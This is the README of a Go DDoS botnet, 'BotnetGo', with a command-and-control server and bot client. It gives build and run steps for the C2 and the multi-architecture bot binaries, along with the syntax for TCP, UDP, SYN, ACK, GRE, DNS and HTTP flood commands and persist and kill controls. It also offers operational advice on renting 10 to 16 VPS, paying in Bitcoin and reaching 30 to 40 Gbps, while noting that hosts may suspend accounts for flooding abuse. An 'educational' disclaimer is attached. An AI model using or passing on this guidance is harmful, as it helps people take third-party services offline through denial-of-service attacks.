# Golang Botnet focused on basic network stressing 

V4 Soon, V4 NOW it in Development as we speak, This will combind both Gostress-V2 + BotnetGo Project together hopefully making one big C2 Framework with a REST API on web dashboard + terminal supporting openssl TLS 1.3 Enfored + Trusted.

>
> 2025-04-N/A
>
>https://github.com/1Birdo/GoStress

> 2024-09-20
>
> Last Botnet Source Release, trying to do more alternative and better projects.


## Overview
This project implements a simple Botnet Control and Command (CnC) server in Go, enabling users to manage connected bots and execute various network attack commands.

## Features
- **User Authentication**: Secure login and credential management.
- **Bot Management**: Connect and manage multiple bots.
- **Attack Execution**: Send commands to bots for executing different types of network attacks.
- **Logging**: Track bot connections and actions.

## Prerequisites
- Go 1.18 or higher
- Terminal/command line interface
- Basic understanding of Go and network programming

**![image1](https://github.com/user-attachments/assets/812f9717-c037-4399-ba57-e9bf4f610326)**


## Installation
1. **Clone the repository**:
   ```bash
   git clone https://github.com/Birdo1221/BotnetGo.git
   cd BotnetGo/cnc
   ```
2. **Install dependencies**:
   ```bash
   go mod init cnc
   go mod tidy
   ```
3. **Build the project**:
   ```bash
   go build -o cnc *.go
   ```
4. **Run the server**:
   If the any of the ports are defined below 1024,
   you will need to run with sudo privilages to bind to that port.
   I would also recommend running using ```screen``` to run with it so it
   doesnt get killed for idle memory usage or kill the process after you close the program
    ```bash
   ./cnc
    
   sudo apt install screen 
   screen ./cnc 
   ```
   
6. **Running the Device / Bot files**:
   You bascially want to enter into the ```bash Devices``` Directory
   and do the exact same you did in the CNC directory
   ```bash
   cd ../device
   ```
   Then to build just run the build.sh script to make all the different arch types,
   but if you just want to build it for standard x86 or just without defining anything just run

    ```bash
    sh build.sh
   ```
    For without defining
    ```bash
     go build -o Botfile bot.go
   ```

## Configuration
Edit the constants in `main.go` to configure:
- **User and Bot Server IPs**: Adjust `USER_SERVER_IP` and `BOT_SERVER_IP`.
- **Server Ports**: Modify `USER_SERVER_PORT` and `BOT_SERVER_PORT`.
- **Killer**: Modify `killerEnabled` to `true` if you want to run on runtime and not when commanded to.

**![image](https://github.com/user-attachments/assets/d5886f8c-1ac4-485d-b88c-b63a0acd51ff)**


## Usage
- Start the server and connect your bots.
- Use the CLI to log in and execute commands.
  ### e.g. Termum, Mobaxterm or Putty
- Attacks command to start an attack:
  ```bash
  !tcpflood <target_ip> <target_port> <duration>
  !udpflood <target_ip> <target_port> <duration>
  !udpsmart <target_ip> <target_port> <duration>
  !syn <target_ip> <target_port> <duration>
  !ack <target_ip> <target_port> <duration>
  !gre <target_ip> <duration> // you will need to send a port anyway
  !dns <target_ip> <target_port> <duration>
  !http <target_ip> <target_port> <duration> // still in the works
  ```
- Alternative command to send:
  ```bash
  !kill
  !lock
  !persist
  ```


  ## Logging in 
1. **How to Login**:
   On Line 290 there is a string that is prompted to be called for before being able to login to it
   e.g. loginforme


2. **Users **:

   After that, you will be prompted to enter a username and password.
   If you don't remember them, you can check the users.json file,
   which contains the login information and more.  

4.  **Future Development/ Power problem **:
 ```
   When searching for a reliable source, one of the most significant concerns is the power it can deliver.
   Many users face challenges when a single source does not meet their expectations,
   they often switch to a differnt source or just abandon their search altogether.

   This source is designed to provide the expected performance. To start fully utilizing this source you
   will need around 10 to 16 servers, each equipped with 1 core and 1 GB 
   of RAM, and an output capacity of 1 Gbps, you can achieve approximately 30 to 40 Gbps for UDP traffic.

   I'd recommend using rental hosts for this purpose, as it allows you to create multiple server instances without
   having to pay an entire upfront cost of buying several servers. On average, with a Command and Control (CNC) server
   to test this would cost around 20 GBP (British Pounds) in Bitcoin.

   You can obtain affordable servers by using a rental VPS service or a budget host.
   However, be aware that VPS providers like OVH, Vultr, or Linode may terminate or suspend
   your VPS due to bandwidth or flooding abuse.
  ```
Performance may vary based on several factors, including:
 ```bash
   *.Packet size
   *.Server output
   *.RTT based on geolocation
   ```
For TCP methods, similar performance can be expected for each methods, typically ranging from 20 to 28 Gbps, though this is also influenced by various conditions.
   
## Disclaimer

#  ```This project is for educational purposes only. Ensure you have permission before testing any network security tools on remote servers. I bear no responsibility or obligation to anyone using this for malicious purposes. ```

DDoS attacks are a serious crime that disrupt critical infrastructure, causing significant damage. Initiatives like Operation PowerOFF and Operation Endgame have highlighted the growing threat, targeting cybercriminals behind DDoS-for-hire services. These operations emphasize that DDoS is no longer just a nuisance but a severe offense with real-world consequences, and those involved face legal repercussions.

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
